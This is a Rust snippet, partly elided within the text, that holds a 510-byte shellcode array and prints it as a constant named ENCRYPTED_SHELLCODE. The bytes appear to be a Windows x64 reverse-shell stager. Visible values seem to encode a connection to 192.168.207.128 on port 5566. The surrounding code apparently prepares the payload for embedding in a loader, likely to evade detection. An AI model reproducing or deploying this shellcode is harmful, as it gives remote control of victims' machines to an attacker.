...
fn main() {
    let mut shellcode: [u8; 510] = [0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,
        0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,
        0x48,0x8b,0x52,0x60,0x51,0x48,0x8b,0x52,0x18,0x56,0x48,0x8b,
        ...
        0x00,0x00,0x49,0x89,0xe5,0x49,0xbc,0x02,0x00,0x15,0xbe,0xc0,
        0xa8,0xcf,0x80,0x41,0x54,0x49,0x89,0xe4,0x4c,0x89,0xf1,0x41,
    ...
    println!("pub const ENCRYPTED_SHELLCODE: &[u8; {}] = &{:?};", shellcode.len(), shellcode);
}